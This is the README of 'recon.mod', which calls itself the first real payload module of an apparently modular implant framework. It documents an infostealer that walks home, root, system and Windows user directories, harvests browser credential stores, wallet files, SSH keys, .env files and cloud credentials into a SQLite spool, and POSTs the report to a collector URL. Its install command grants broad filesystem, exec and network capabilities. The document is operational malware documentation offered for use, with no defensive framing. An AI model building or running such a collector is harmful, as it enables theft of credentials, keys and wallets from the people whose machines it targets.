# recon.mod

ABI 2 collector. Walks roots, matches stealer-relevant filenames, stores the
file heads in the state SQLite spool, and optionally POSTs the manifest.

This is the first real payload module and the reference for ABI 2 use.

## Install

```sh
./build.sh
adminctl --state "$STATE" mod add recon.mod 0.1.0 ./mod_recon.wasm --abi 2 \
  --cap fs_read:/home/* --cap fs_read:/root/* --cap fs_read:/etc/* \
  --cap fs_read:/tmp/* --cap fs_read:/var/lib/* \
  --cap spool:/home/* --cap spool:/root/* --cap spool:/etc/* \
  --cap spool:/tmp/* --cap spool:/var/lib/* \
  --cap exec:uname --cap exec:cmd --cap net:http*://* --cap env:OS
```

`agentd` must also allow the same rules in `config.toml` (or a superset) and
both `allow_exec = true` and `allow_net = true` when POST is wanted.

## Task arguments

All optional:

```json
{
  "roots": ["/home"],
  "max_depth": 4,
  "max_bytes": 524288,
  "patterns": ["login data", "wallet.dat"],
  "post_url": "https://collector.example/ingest"
}
```

- `roots` defaults to `/home`, `/root`, `/etc`, `/var/lib`, `/tmp` (Unix) or
  `C:/Users`, `C:/ProgramData` (when `OS` contains `windows`).
- `max_depth` caps recursion (default 4, hard cap 12).
- `max_bytes` caps each spooled file head (default 512 KiB, hard cap 1 MiB).
- `patterns` are case-insensitive substrings; defaults cover Chromium/Firefox
  credential stores, wallet files, SSH keys, `.env`, cloud credentials,
  `config.json`, `settings.py`, `Local State`, and LevelDB.
- `post_url` POSTs the final report. Without it the report is only the result
  frame (about 4 KB on the wire, so use a POST for large reports).

## Spool

`<state>/spool.db`, table `artifacts`:

```sql
id INTEGER PRIMARY KEY, path TEXT, sha256 TEXT, size INTEGER,
kind TEXT, captured_at INTEGER, data BLOB
```

The spool is capped at 512 MiB; the oldest 10% is deleted when over. It is
plaintext and lives on the state disk.

## Limits

2048 entries per directory, 20,000 entries per run, 400 findings per report,
1 MiB per ranged read and per POST body, 30 s deadline. `read_dir` does not
follow symlinks, so a walk cannot loop.
